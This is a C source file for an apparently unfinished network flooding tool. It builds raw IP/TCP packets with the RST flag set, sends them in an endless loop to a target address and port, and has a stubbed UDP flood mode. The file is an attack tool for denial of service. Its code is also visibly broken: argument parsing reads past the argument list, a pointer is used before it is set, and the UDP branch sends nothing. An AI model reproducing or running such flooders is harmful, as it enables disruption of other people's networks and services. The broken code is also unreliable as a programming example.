#define _BSD_SOURCE
#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/socket.h>

//IP header (struct iphdr) definition
#include <linux/ip.h>
//TCP header (struct tcphdr) definition
#include <linux/tcp.h>
//UDP header (struct udphdr) definition

#include <linux/udp.h>
#include <zconf.h>
#include <netdb.h>
#include <string.h>
#define PACKET_SIZE 512
#define DATA "data"
struct pseudo_TCP_packet    //needed for checksum calculation
{
    uint32_t srcAddr;
    uint32_t dstAddr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t TCP_len;
    struct tcphdr tcp;
};


unsigned short check_sum(unsigned short *ptr,int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}


int main(int argc, char* argv[]) {
    int port = 443, source_port = 5678;
    char* t_ip = "127.0.0.1";
    //find the host ip.
    char * s_ip = "127.0.0.1";
    int sock,one = 1;
    int udp=0;

    for (int i = 1; i < argc; ++i) {  // need to be fix
        if(!strcmp(argv[i+1],"-t")){
            //get target ip address. default is 127.0.01
            t_ip= argv[i];
            i++;
        }
        else if(!strcmp(argv[i],"-r")){
            //change to udp flood.
            udp = 1;
        }
        else if(!strcmp(argv[i],"-p")){
            //change target port. default is 443
            port = atoi(argv[i+1]);
            i++;
        }
    }

    char data[PACKET_SIZE];  // Ip header + TCP/UDP header + data
    struct sockaddr_in addr_in;
    struct pseudo_TCP_packet pseudo_header;
    char* pseudo_packet;
    char* packet;
    struct iphdr* ip_header = (struct iphdr*) data;
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;

    addr_in.sin_family = AF_INET;
    addr_in.sin_port= htons(port);
    addr_in.sin_addr.s_addr = inet_addr(t_ip);
    memset(data, 0, PACKET_SIZE);
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->ihl = 5;
    ip_header->id = htons(54321);
    ip_header->ttl = 255;
    ip_header->frag_off = 0;
    ip_header->check = 0;
    ip_header->daddr = inet_addr(t_ip);
    ip_header->saddr = inet_addr(s_ip); // need to fix this, what ip should i put here.

    if(udp){
        udp_header = (struct udphdr*) (data + sizeof(struct iphdr));
        ip_header->protocol = IPPROTO_UDP;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct  udphdr);
        ip_header->check = check_sum((unsigned short *)data, ip_header->tot_len);
        sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(sock < 0){
            printf("Failed to open socket.");
            exit(1);
        }
        udp_header->source = htons(3456);
        udp_header->dest = htons(port);
        udp_header->check = 0;
        udp_header->len = htons(8);

    }
    else{
        tcp_header = (struct tcphdr*)(data + sizeof(struct iphdr));
        packet = (char *) (packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
        strcpy(packet, DATA);
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(sock<0){
            printf("Failed to open sockket.");
            exit(1);
        }
        //initialize tcp header
        tcp_header->source = htons(source_port);
        tcp_header->dest = htons(port);
        tcp_header->seq = 0;
        tcp_header->ack_seq =0;
        tcp_header->doff = 5;
        tcp_header->syn= 0;
        tcp_header->fin = 0;
        tcp_header->rst =1;
        tcp_header->ack =0;
        tcp_header->urg = 0;
        tcp_header->psh = 0;
        tcp_header->window = htons(155);
        tcp_header->check= 0;

        //caclulate checksum for ip header
        ip_header->protocol= IPPROTO_TCP;
        ip_header->tot_len = sizeof(struct iphdr) +sizeof(struct tcphdr);
        ip_header->check = check_sum((unsigned short *) data,ip_header->tot_len);


        //now we can calculate the checksum for the tcp header
        pseudo_header.dstAddr = addr_in.sin_addr.s_addr;
        pseudo_header.srcAddr = inet_addr(s_ip);
        pseudo_header.zero = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.TCP_len = htons(sizeof(struct iphdr) + PACKET_SIZE);

        pseudo_packet = (char *) malloc((int) (sizeof(struct pseudo_TCP_packet) + sizeof(struct tcphdr) + PACKET_SIZE));
        memset(pseudo_packet, 0, sizeof(struct pseudo_TCP_packet) + sizeof(struct tcphdr) + strlen(data));

        memcpy(pseudo_packet, (char *) &pseudo_header, sizeof(struct pseudo_TCP_packet));
        tcp_header->check = check_sum((unsigned  short *)pseudo_packet,(int)(sizeof(struct pseudo_TCP_packet) + sizeof(struct tcphdr) + PACKET_SIZE));
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error while setting socket options");
        exit(-1);
    }
    while(1){
        if(udp){


        }
        else{
            if(sendto(sock,data,ip_header->tot_len, 0, (struct sockaddr*)&addr_in,sizeof(addr_in))<0){
                printf("Error in sendto");
                exit(1);
            }
            tcp_header->check = 0;
            memcpy(pseudo_packet +sizeof(struct pseudo_TCP_packet),tcp_header,sizeof(struct tcphdr) + strlen(data));
            tcp_header->check = check_sum((unsigned short*) pseudo_packet,(int)(sizeof(struct pseudo_TCP_packet) + sizeof(struct tcphdr) + PACKET_SIZE));
        }

    }



    printf("Hello, World!\n");
    return 0;
}


